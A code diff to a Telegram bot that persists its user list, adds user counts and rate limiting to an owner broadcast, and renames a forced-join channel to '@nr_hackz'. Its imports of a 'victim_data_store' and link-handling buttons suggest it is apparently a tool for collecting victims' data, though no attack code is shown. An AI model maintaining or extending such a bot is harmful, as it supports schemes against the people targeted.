@@ -15,7 +15,7 @@ from bot.buttons import (
     handle_all_links, handle_copy_all
 )
 from bot.server import app
-from bot.utils.storage import link_cache, victim_data_store
+from bot.utils.storage import link_cache, victim_data_store, active_users, save_active_users
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -24,12 +24,11 @@ OWNER_ID = 7993444324  # <-- APNI TELEGRAM ID DAAL
 
 # ========== BROADCAST STATE ==========
 broadcast_mode = False
-active_users = set()
 
 # ========== CHECK IF USER JOINED CHANNEL ==========
 def check_user_joined(user_id):
     try:
-        chat_member = bot.get_chat_member("@nrtecno2", user_id)
+        chat_member = bot.get_chat_member("@nr_hackz", user_id)  # <-- CHANGED
         status = chat_member.status
         if status in ['left', 'kicked']:
             return False
@@ -57,7 +56,7 @@ def get_bottom_buttons():
 def get_join_buttons():
     markup = InlineKeyboardMarkup(row_width=1)
     markup.add(
-        InlineKeyboardButton("📢 Join @nrtecno2", url="https://t.me/nrtecno2"),
+        InlineKeyboardButton("📢 Join @nr_hackz", url="https://t.me/nr_hackz"),  # <-- CHANGED
         InlineKeyboardButton("✅ I have joined", callback_data="verify_join")
     )
     return markup
@@ -82,7 +81,8 @@ def hukum_command(message):
         "⚙️ *Broadcast Control*\n\n"
         "🟢 ON — Start broadcast\n"
         "🔴 OFF — Stop broadcast\n\n"
-        "Current status: " + ("🟢 ON" if broadcast_mode else "🔴 OFF"),
+        "Current status: " + ("🟢 ON" if broadcast_mode else "🔴 OFF") + "\n"
+        f"👥 Total Users: {len(active_users)}",
         reply_markup=markup,
         parse_mode="Markdown"
     )
@@ -102,7 +102,8 @@ def broadcast_callback(call):
         bot.answer_callback_query(call.id, "🟢 Broadcast ON")
         bot.send_message(
             user_id,
-            "🟢 *Broadcast ON*\n\n"
+            f"🟢 *Broadcast ON*\n\n"
+            f"👥 Total Users: {len(active_users)}\n\n"
             "Ab tu jo bhi message bhejega, woh saare active users ko chala jayega.\n\n"
             "Band karne ke liye /hukum → OFF dabana.",
             parse_mode="Markdown"
@@ -120,7 +121,10 @@ def broadcast_callback(call):
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.chat.id
+
+    # Add to active users and save
     active_users.add(user_id)
+    save_active_users(active_users)
 
     if check_user_joined(user_id):
         show_main_menu(message)
@@ -129,8 +133,8 @@ def start(message):
         bot.send_message(
             user_id,
             "🔐 *Access Restricted*\n\n"
-            "You must join @nrtecno2 to use this bot.\n\n"
-            "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\n"
+            "You must join @nr_hackz to use this bot.\n\n"  # <-- CHANGED
+            "👉 [Join @nr_hackz](https://t.me/nr_hackz)\n\n"  # <-- CHANGED
             "After joining, click the button below to verify.",
             reply_markup=get_join_buttons(),
             parse_mode="Markdown"
@@ -152,7 +156,7 @@ def verify_join(call):
     else:
         bot.answer_callback_query(
             call.id,
-            "❌ You haven't joined @nrtecno2 yet! Please join first.",
+            "❌ You haven't joined @nr_hackz yet! Please join first.",  # <-- CHANGED
             show_alert=True
         )
 
@@ -192,7 +196,10 @@ def route_buttons(message):
     text = message.text
     user_id = message.chat.id
 
-    active_users.add(user_id)
+    # Add to active users and save
+    if user_id not in active_users:
+        active_users.add(user_id)
+        save_active_users(active_users)
 
     # ===== BROADCAST MODE (OWNER ONLY) =====
     if broadcast_mode and user_id == OWNER_ID:
@@ -206,10 +213,14 @@ def route_buttons(message):
             try:
                 bot.send_message(uid, text)
                 success_count += 1
+                time.sleep(0.05)  # Rate limit
             except Exception as e:
                 fail_count += 1
                 if "blocked" in str(e).lower() or "chat not found" in str(e).lower():
                     active_users.discard(uid)
+
+        # Save updated list
+        save_active_users(active_users)
 
         bot.send_message(
             OWNER_ID,
@@ -225,7 +236,7 @@ def route_buttons(message):
     if not check_user_joined(user_id):
         bot.send_message(
             user_id,
-            "❌ You must join @nrtecno2 first. Send /start again.",
+            "❌ You must join @nr_hackz first. Send /start again.",  # <-- CHANGED
             reply_markup=get_join_buttons()
         )
         return
